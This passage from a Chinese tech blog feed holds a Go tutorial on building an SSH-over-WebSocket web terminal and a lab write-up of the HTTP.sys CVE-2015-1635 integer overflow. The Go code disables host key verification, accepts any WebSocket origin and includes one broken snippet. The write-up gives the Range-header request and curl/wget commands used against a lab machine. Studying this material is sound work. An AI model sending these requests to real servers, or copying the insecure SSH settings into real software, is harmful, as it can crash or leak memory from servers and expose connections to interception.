class="title">AuthMethod</span></span> &#123;</span><br><span class="line">	keyPath, err := homedir.Expand(kPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;find key&#x27;s home dir failed&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	key, err := ioutil.ReadFile(keyPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;ssh key file read failed&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Create the Signer for this private key.</span></span><br><span class="line">	signer, err := ssh.ParsePrivateKey(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;ssh key signer failed&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ssh.PublicKeys(signer)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码详解</p>
<ol>
<li>配置<code>ssh.ClientConfig</code></li>
</ol>
<ul>
<li>建设<code>TimeOut</code>自定义一个比较端的时间</li>
<li>自定义<code>HostKeyCallback</code>如果想简便就使用<code>ssh.InsecureIgnoreHostKey</code>回调</li>
<li><code>publicKeyAuthFunc</code>如果使用key登录，就需要用这个函数量读取<code>id_rsa</code>私钥，当然您可以自定义这个访问让他支持字符串</li>
</ul>
<ol start="2">
<li><code>ssh.Dial</code>创建ssh客户端</li>
</ol>
<p>拼接字符串得到ssh连接地址，同时不要忘记defer client.Close()</p>
<ol start="3">
<li><code>sshClient.NewSession</code>创建session会话</li>
</ol>
<ul>
<li>可以自定义stdin，stdout</li>
<li>可以创建pty</li>
<li>可以SetEnv</li>
</ul>
<ol start="4">
<li>执行命令<code>CombinedOutput run ...</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go run main.go</span><br><span class="line">total 84</span><br><span class="line">dr-xr-xr-x. 20 root  root   4096 Sep 28 09:38 .</span><br><span class="line">dr-xr-xr-x. 20 root  root   4096 Sep 28 09:38 ..</span><br><span class="line">-rw-r--r--   1 root  root      0 Aug 18  2017 .autorelabel</span><br><span class="line">lrwxrwxrwx.  1 root  root      7 Aug 18  2017 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.  4 root  root   4096 Sep 12  2017 boot</span><br><span class="line">drwxrwxr-x   2 rsync rsync  4096 Jul 29 23:37 data</span><br><span class="line">drwxr-xr-x  19 root  root   2980 Jul 28 13:29 dev</span><br><span class="line">drwxr-xr-x. 95 root  root  12288 Nov  5 23:46 etc</span><br><span class="line">drwxr-xr-x.  5 root  root   4096 Nov  3 16:11 home</span><br><span class="line">lrwxrwxrwx.  1 root  root      7 Aug 18  2017 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.  1 root  root      9 Aug 18  2017 lib64 -&gt; usr/lib64</span><br><span class="line">drwx------.  2 root  root  16384 Aug 18  2017 lost+found</span><br><span class="line">drwxr-xr-x.  2 root  root   4096 Nov  5  2016 media</span><br><span class="line">drwxr-xr-x.  3 root  root   4096 Jul 28 21:01 mnt</span><br><span class="line">drwxr-xr-x   4 root  root   4096 Sep 28 09:38 nginx_test</span><br><span class="line">drwxr-xr-x.  8 root  root   4096 Nov  3 16:10 opt</span><br><span class="line">dr-xr-xr-x  87 root  root      0 Jul 28 13:26 proc</span><br><span class="line">dr-xr-x---. 18 root  root   4096 Nov  4 00:38 root</span><br><span class="line">drwxr-xr-x  27 root  root    860 Nov  4 21:57 run</span><br><span class="line">lrwxrwxrwx.  1 root  root      8 Aug 18  2017 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.  2 root  root   4096 Nov  5  2016 srv</span><br><span class="line">dr-xr-xr-x  13 root  root      0 Jul 28 21:26 sys</span><br><span class="line">drwxrwxrwt.  8 root  root   4096 Nov  5 03:09 tmp</span><br><span class="line">drwxr-xr-x. 13 root  root   4096 Aug 18  2017 usr</span><br><span class="line">drwxr-xr-x. 21 root  root   4096 Nov  3 16:10 var</span><br></pre></td></tr></table></figure>

<h1 id="二、WebSocket简介"><a href="#二、WebSocket简介" class="headerlink" title="二、WebSocket简介"></a>二、WebSocket简介</h1><p>HTML5开始提供的一种浏览器与服务器进行双工通讯的网络技术，属于应用层协议，它基于TCP传输协议，并复用HTTP的握手通道：</p>
<p>对大部分web开发者来说，上面描述有点枯燥，只需要记下以下三点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. WebSocket可以在浏览器里使用</span><br><span class="line">2. 支持双向通信</span><br><span class="line">3. 使用很简单</span><br></pre></td></tr></table></figure>

<p>对比HTTP协议的话，概括的说就是: 支持双向通信，更灵活，更高效，可扩展性更好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 支持双向通信,实时性更强</span><br><span class="line">2. 更好的二进制支持</span><br><span class="line">3. 较少的控制开销,连接创建后,客户端和服务端进行数据交换时,协议控制的数据包头部较小,在不包含头部的情况下,服务端到客户端的包头只有2-10字节(取决于数据包长度), 客户端到服务端的话,需要加上额外4字节的掩码,而HTTP每次同年高新都需要携带完整的头部</span><br><span class="line">4. 支持扩展,ws协议定义了扩展, 用户可以扩展协议, 或者实现自定义的子协议</span><br></pre></td></tr></table></figure>

<h1 id="三、基于Web的Terminal终端控制台"><a href="#三、基于Web的Terminal终端控制台" class="headerlink" title="三、基于Web的Terminal终端控制台"></a>三、基于Web的Terminal终端控制台</h1><h2 id="1、解决问题"><a href="#1、解决问题" class="headerlink" title="1、解决问题"></a>1、解决问题</h2><p>完成这样一个Web Terminal的目的主要是解决几个问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.一定程度上取代xshell，secureRT，putty等ssh终端</span><br><span class="line">2.方便身份认证，访问控制</span><br><span class="line">3.方便使用，不受电脑环境的影响</span><br></pre></td></tr></table></figure>

<h2 id="2、数据流向"><a href="#2、数据流向" class="headerlink" title="2、数据流向"></a>2、数据流向</h2><p>要实现远程登录的功能，其数据流向大概为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">浏览器 &lt;--&gt;  WebSocket  &lt;---&gt; SSH &lt;---&gt; Linux OS</span><br></pre></td></tr></table></figure>

<p>实现流程</p>
<ol>
<li>浏览器将主机的信息(ip, 用户名, 密码, 请求的终端大小等)进行加密，传给后台, 并通过HTTP请求与后台协商升级协议。协议升级完成后，后续的数据交换则遵照web Socket的协议。</li>
<li>后台将HTTP请求升级为web Socket协议，得到一个和浏览器数据交换的连接通道</li>
<li>后台将数据进行解密拿到主机信息，创建一个SSH 客户端，与远程主机的SSH 服务端协商加密，互相认证, 然后建立一个SSH Channel</li>
<li>后台和远程主机有了通讯的信道, 然后后台将终端的大小等信息通过SSH Channel请求远程主机创建一个 pty(伪终端)，并请求启动当前用户的默认 shell</li>
<li>后台通过 Socket连接通道拿到用户输入，再通过SSH Channel将输入传给pty，pty将这些数据交给远程主机处理后按照前面指定的终端标准输出到SSH Channel中，同时键盘输入也会发送给SSH Channel</li>
<li>后台从SSH Channel中拿到按照终端大小的标准输出后又通过Socket连接将输出返回给浏览器，由此变实现了Web Terminal</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677396480641-cd5e3977-553c-4ff9-9d84-f571b3e946d5.png" alt="1677396480641-cd5e3977-553c-4ff9-9d84-f571b3e946d5"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677396495359-e6e7e983-f678-4157-bb77-7fbaafe747c6.png" alt="1677396495359-e6e7e983-f678-4157-bb77-7fbaafe747c6"></p>
<h2 id="3、代码实现"><a href="#3、代码实现" class="headerlink" title="3、代码实现"></a>3、代码实现</h2><p>照上面的使用流程基于代码解释如何实现</p>
<h3 id="（1）升级HTTP协议为WebSocket"><a href="#（1）升级HTTP协议为WebSocket" class="headerlink" title="（1）升级HTTP协议为WebSocket"></a>（1）<strong>升级HTTP协议为WebSocket</strong></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> upgrader = websocket.Upgrader&#123;</span><br><span class="line">	ReadBufferSize:  <span class="number">1024</span>,</span><br><span class="line">	WriteBufferSize: <span class="number">1024</span>,</span><br><span class="line">	CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（2）升级协议并获得socket连接"><a href="#（2）升级协议并获得socket连接" class="headerlink" title="（2）升级协议并获得socket连接"></a>（2）<strong>升级协议并获得socket连接</strong></h3><p>conn就是socket连接通道，接下来后台和浏览器之间的通讯都将基于这个通道</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">conn, err := upgrader.Upgrade(c.Writer, c.Request, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    c.Error(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（3）后台拿到主机信息，建立ssh客户端"><a href="#（3）后台拿到主机信息，建立ssh客户端" class="headerlink" title="（3）后台拿到主机信息，建立ssh客户端"></a>（3）后台拿到主机信息，建立ssh客户端</h3><p>ssh客户端结构体</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SSHClient <span class="keyword">struct</span> &#123;</span><br><span class="line">	Username  <span class="keyword">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">	Password  <span class="keyword">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	IpAddress <span class="keyword">string</span> <span class="string">`json:&quot;ipaddress&quot;`</span></span><br><span class="line">	Port      <span class="keyword">int</span>    <span class="string">`json:&quot;port&quot;`</span></span><br><span class="line">	Session   *ssh.Session</span><br><span class="line">	Client    *ssh.Client</span><br><span class="line">	channel   ssh.Channel</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新的ssh客户端时, 默认用户名为root, 端口为22</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSSHClient</span><span class="params">()</span> <span class="title">SSHClient</span></span> &#123;</span><br><span class="line">	client := SSHClient&#123;&#125;</span><br><span class="line">	client.Username = <span class="string">&quot;root&quot;</span></span><br><span class="line">	client.Port = <span class="number">22</span></span><br><span class="line">	<span class="keyword">return</span> client</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化的时候我们只有主机的信息，而Session，client，channel都是空的，现在先生成真正的client</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *SSHClient)</span> <span class="title">GenerateClient</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		auth         []ssh.AuthMethod</span><br><span class="line">		addr         <span class="keyword">string</span></span><br><span class="line">		clientConfig *ssh.ClientConfig</span><br><span class="line">		client       *ssh.Client</span><br><span class="line">		config       ssh.Config</span><br><span class="line">		err          error</span><br><span class="line">	)</span><br><span class="line">	auth = <span class="built_in">make</span>([]ssh.AuthMethod, <span class="number">0</span>)</span><br><span class="line">	auth = <span class="built_in">append</span>(auth, ssh.Password(this.Password))</span><br><span class="line">	config = ssh.Config&#123;</span><br><span class="line">		Ciphers: []<span class="keyword">string</span>&#123;<span class="string">&quot;aes128-ctr&quot;</span>, <span class="string">&quot;aes192-ctr&quot;</span>, <span class="string">&quot;aes256-ctr&quot;</span>, <span class="string">&quot;aes128-gcm@openssh.com&quot;</span>, <span class="string">&quot;arcfour256&quot;</span>, <span class="string">&quot;arcfour128&quot;</span>, <span class="string">&quot;aes128-cbc&quot;</span>, <span class="string">&quot;3des-cbc&quot;</span>, <span class="string">&quot;aes192-cbc&quot;</span>, <span class="string">&quot;aes256-cbc&quot;</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	clientConfig = &amp;ssh.ClientConfig&#123;</span><br><span class="line">		User:    this.Username,</span><br><span class="line">		Auth:    auth,</span><br><span class="line">		Timeout: <span class="number">5</span> * time.Second,</span><br><span class="line">		Config:  config,</span><br><span class="line">		HostKeyCallback: <span class="function"><span class="keyword">func</span><span class="params">(hostname <span class="keyword">string</span>, remote net.Addr, key ssh.PublicKey)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	addr = fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, this.IpAddress, this.Port)</span><br><span class="line">	<span class="keyword">if</span> client, err = ssh.Dial(<span class="string">&quot;tcp&quot;</span>, addr, clientConfig); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	this.Client = client</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ssh.Dial(&quot;tcp&quot;, addr, clientConfig)</code>创建连接并返回客户端，如果主机信息不对或其它问题这里将直接失败</p>
<h3 id="（4）通过ssh客户端创建ssh-channel，并请求一个pty伪终端，请求用户的默认会话"><a href="#（4）通过ssh客户端创建ssh-channel，并请求一个pty伪终端，请求用户的默认会话" class="headerlink" title="（4）通过ssh客户端创建ssh channel，并请求一个pty伪终端，请求用户的默认会话"></a>（4）通过ssh客户端创建ssh channel，并请求一个pty伪终端，请求用户的默认会话</h3><p>如果主机信息验证验证通过，可以通过ssh client创建一个通道：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">channel, inRequests, err := this.Client.OpenChannel(<span class="string">&quot;session&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Println(err)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">this.channel = channel</span><br></pre></td></tr></table></figure>

<p>ssh通道创建完成后，请求一个标准输出的终端，并开启用户的默认shell：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ok, err := channel.SendRequest(<span class="string">&quot;pty-req&quot;</span>, <span class="literal">true</span>, ssh.Marshal(&amp;req))</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Println(err)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">ok, err = channel.SendRequest(<span class="string">&quot;shell&quot;</span>, <span class="literal">true</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Println(err)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（5）远程主机与浏览器实时数据交换"><a href="#（5）远程主机与浏览器实时数据交换" class="headerlink" title="（5）远程主机与浏览器实时数据交换"></a>（5）远程主机与浏览器实时数据交换</h3><p>现在为止建立了两个通道，一个是websocket，一个是ssh channel，后台将起两个主要的协程，一个不停的从websocket通道里读取用户的输入，并通过ssh channel传给远程主机：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里第一个协程获取用户的输入</span></span><br><span class="line"><span class="keyword">go</span> fun() &#123;</span><br><span class="line">    <span class="comment">// p 为用户输入</span></span><br><span class="line">    _, p, err := ws.ReadMessage()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    _, err = this.channel.Write(p)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>第二个主协程将远程主机的数据传递给浏览器，在这个协程里还将起一个协程，不断获取ssh channel里的数据并传给后台内部创建的一个通道，主协程则有一个死循环，每隔一段时间从内部通道里读取数据，并将其通过websocket传给浏览器，所以数据传输并不是真正实时的，而是有一个间隔在，我写的默认为100微秒，这样基本感受不到延迟，而且减少了消耗，有时浏览器输入一个命令获取大量数据时，会感觉数据出现会一顿一顿的便是因为设置了一个间隔：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第二个协程将远程主机的返回结果返回给用户</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    br := bufio.NewReader(this.channel)</span><br><span class="line">    buf := []<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">    t := time.NewTimer(time.Microsecond * <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">defer</span> t.Stop()</span><br><span class="line">    <span class="comment">// 构建一个信道, 一端将数据远程主机的数据写入, 一段读取数据写入ws</span></span><br><span class="line">    r := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">rune</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另起一个协程, 一个死循环不断的读取ssh channel的数据, 并传给r信道直到连接断开</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> this.Client.Close()</span><br><span class="line">        <span class="keyword">defer</span> this.Session.Close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            x, size, err := br.ReadRune()</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Println(err)</span><br><span class="line">                ws.WriteMessage(<span class="number">1</span>, []<span class="keyword">byte</span>(<span class="string">&quot;\033[31m已经关闭连接!\033[0m&quot;</span>))</span><br><span class="line">                ws.Close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> size &gt; <span class="number">0</span> &#123;</span><br><span class="line">                r &lt;- x</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主循环</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="comment">// 每隔100微秒, 只要buf的长度不为0就将数据写入ws, 并重置时间和buf</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-t.C:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(buf) != <span class="number">0</span> &#123;</span><br><span class="line">                err := ws.WriteMessage(websocket.TextMessage, buf)</span><br><span class="line">                buf = []<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    log.Println(err)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            t.Reset(time.Microsecond * <span class="number">100</span>)</span><br><span class="line">        <span class="comment">// 前面已经将ssh channel里读取的数据写入创建的通道r, 这里读取数据, 不断增加buf的长度, 在设定的 100 microsecond后由上面判定长度是否返送数据</span></span><br><span class="line">        <span class="keyword">case</span> d := &lt;-r:</span><br><span class="line">            <span class="keyword">if</span> d != utf8.RuneError &#123;</span><br><span class="line">                p := <span class="built_in">make</span>([]<span class="keyword">byte</span>, utf8.RuneLen(d))</span><br><span class="line">                utf8.EncodeRune(p, d)</span><br><span class="line">                buf = <span class="built_in">append</span>(buf, p...)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                buf = <span class="built_in">append</span>(buf, []<span class="keyword">byte</span>(<span class="string">&quot;@&quot;</span>)...)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<h2 id="4、web-terminal"><a href="#4、web-terminal" class="headerlink" title="4、web-terminal"></a>4、web-terminal</h2><h3 id="（1）前端"><a href="#（1）前端" class="headerlink" title="（1）前端"></a>（1）前端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/chengjoey/web-terminal-client.git</span><br><span class="line"><span class="built_in">cd</span> web-terminal-client</span><br><span class="line"><span class="comment"># install dependencies</span></span><br><span class="line">npm install</span><br><span class="line"><span class="comment"># serve with hot reload at localhost:8080</span></span><br><span class="line">npm run dev</span><br><span class="line"></span><br><span class="line">// 需要的话就执行，不需要的话运行npm run dev即可启动前端了</span><br><span class="line"><span class="comment"># build for production with minification</span></span><br><span class="line">npm run build</span><br><span class="line"><span class="comment"># build for production and view the bundle analyzer report</span></span><br><span class="line">npm run build --report</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677479154824-3b92aee4-2a56-4807-8253-05c6c37dabe2.png" alt="1677479154824-3b92aee4-2a56-4807-8253-05c6c37dabe2"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677479161619-d350bacd-1846-448f-b322-249766c6dcbd.png" alt="1677479161619-d350bacd-1846-448f-b322-249766c6dcbd"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677479194249-23c92182-4e48-498b-bd5e-c571d4ecfcb8.png" alt="1677479194249-23c92182-4e48-498b-bd5e-c571d4ecfcb8"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677479270721-21041175-0159-4f10-a309-a9c6a86b82b3.png" alt="1677479270721-21041175-0159-4f10-a309-a9c6a86b82b3"></p>
<h3 id="（2）后端"><a href="#（2）后端" class="headerlink" title="（2）后端"></a>（2）后端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go get github.com/chengjoey/web-terminal</span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">	web-terminal</span><br><span class="line">Windows:</span><br><span class="line">	web-terminal.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677480113129-a693fd81-a39a-4dfa-871c-2b824ef77b74.png" alt="1677480113129-a693fd81-a39a-4dfa-871c-2b824ef77b74"></p>
<h3 id="（3）使用"><a href="#（3）使用" class="headerlink" title="（3）使用"></a>（3）使用</h3><p>访问<a href="http://127.0.0.1:5001/">http://127.0.0.1:5001/</a> ，即可进行连接和shell操作</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677480342707-8d1a47a8-da6e-446d-bf13-218f9a5c850b.png" alt="1677480342707-8d1a47a8-da6e-446d-bf13-218f9a5c850b"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1677480351391-6790ddf1-a852-40f6-876f-00df9c7660bd.png" alt="1677480351391-6790ddf1-a852-40f6-876f-00df9c7660bd"></p>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><p><a href="https://www.cnblogs.com/you-men/p/13934845.html">https://www.cnblogs.com/you-men/p/13934845.html</a></p>
<p><a href="https://mojotv.cn/2019/05/22/golang-ssh-session">https://mojotv.cn/2019/05/22/golang-ssh-session</a></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP.sys远程代码执行（CVE-2015-1635）</title>
    <url>/post/bd0dfd63.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近和师傅们参与了一些众测项目，发现师傅们提交了很多关于HTTP.sys远程代码执行的漏洞，于是在网上搜集了些资料进行学习</p>
<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><h2 id="1、HTTP-sys简介"><a href="#1、HTTP-sys简介" class="headerlink" title="1、HTTP.sys简介"></a>1、HTTP.sys简介</h2><p><code>HTTP.sys</code>是<code>Microsoft Windows</code>处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从<code>IIS6.0</code>引入，IIS服务进程依赖<code>HTTP.sys</code>。<code>HTTP.sys</code>远程代码执行漏洞实质是<code>HTTP.sys</code>的<strong>整数溢出漏洞</strong></p>
<p>我们通过给IIS服务器发送这样格式的HTTP请求，就可以触发（检测）这个漏洞：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>stuff</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-18446744073709551615</span><br></pre></td></tr></table></figure>

<p>若IIS服务器返回“<code>Requested Range Not Satisfiable</code>”，则是存在漏洞，否则如果返回“<code>The request has an invalid header name</code>”，则说明漏洞已经修补。</p>
<h2 id="2、漏洞成因"><a href="#2、漏洞成因" class="headerlink" title="2、漏洞成因"></a>2、漏洞成因</h2><p>远程执行代码漏洞存在于 HTTP 协议堆栈 (<code>HTTP.sys</code>) 中，当<code>HTTP.sys</code>未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
<h2 id="3、漏洞危害"><a href="#3、漏洞危害" class="headerlink" title="3、漏洞危害"></a>3、漏洞危害</h2><p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。</p>
<h2 id="4、影响版本"><a href="#4、影响版本" class="headerlink" title="4、影响版本"></a>4、影响版本</h2><p>任何安装了微软<code>IIS 6.0</code>以上的的<code>Windows 7</code>、<code>Windows Server 2008 R2</code>、 <code>Windows Server 2012 R2</code> 、<code>Windows Server 2012</code>、<code>Windows 8.2</code>、<code>Windows 8.1</code> 系统</p>
<h1 id="二、漏洞环境部署"><a href="#二、漏洞环境部署" class="headerlink" title="二、漏洞环境部署"></a>二、漏洞环境部署</h1><p>环境部署：windows7下安装IIS服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650165960595-0c6ec099-33e2-4233-92ea-8ae75b2d1c56.png" alt="img"></p>
<p>如果发现安装完成后，机子上仍没有IIS服务，建议查看以下win7的版本（桌面的计算机单击右键属性，即可查看），旗舰版、企业版和专业版有IIS功能，家庭版和简易版是没有的。需要将家庭版升级为旗舰版即可。</p>
<p> 升级办法可参考：<a href="http://jingyan.baidu.com/article/08b6a591ed82d314a809228d.html">http://jingyan.baidu.com/article/08b6a591ed82d314a809228d.html</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650167173320-25835b8c-5981-4659-8984-419cbc795297.png" alt="img"></p>
<p>安装成功！启动即可，不作任何设置。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650167422806-0645d2d3-7075-4c34-b277-87bb0ee601d8.png" alt="img"></p>
<p>访问下当前IP地址，查看IIS版本</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650167488963-dcf6db45-1c7a-430f-8cb1-0e9674495b29.png" alt="img"></p>
<h1 id="三、漏洞验证"><a href="#三、漏洞验证" class="headerlink" title="三、漏洞验证"></a>三、漏洞验证</h1><p>靶机Win7：192.168.43.155  攻击机Kali：192.168.43.167</p>
<h2 id="1、使用curl、wget命令进行测试"><a href="#1、使用curl、wget命令进行测试" class="headerlink" title="1、使用curl、wget命令进行测试"></a>1、使用curl、wget命令进行测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.43.155 -H <span class="string">&quot;Host: 192.168.43.155&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">wget 192.168.43.155 -–debug -–header=<span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650168112796-4b9e1e04-b317-460d-b133-b54d7b1cd77c.png" alt="img"></p>
<p>返回416，说明该系统存在漏洞，其中Range字段值<code>18446744073709551615</code>表示：转为十六进制是 <code>0xFFFFFFFFFFFFFFFF</code>(16个F），是<strong>64位无符号整型</strong>所能表达的最大整数，整数溢出往往和这个超大整数有关。</p>
<h2 id="2、使用Python脚本验证：CVE-2015-1635-POC"><a href="#2、使用Python脚本验证：CVE-2015-1635-POC" class="headerlink" title="2、使用Python脚本验证：CVE-2015-1635 POC"></a>2、使用Python脚本验证：CVE-2015-1635 POC</h2><p>POC链接：<a href="https://github.com/w01ke/CVE-2015-1635-POC">https://github.com/w01ke/CVE-2015-1635-POC</a></p>
<h2 id="3、burpsuite抓包测试"><a href="#3、burpsuite抓包测试" class="headerlink" title="3、burpsuite抓包测试"></a>3、burpsuite抓包测试</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650276570717-3a240602-90de-42cc-ad4e-3b1e049ed9fb.png" alt="img"></p>
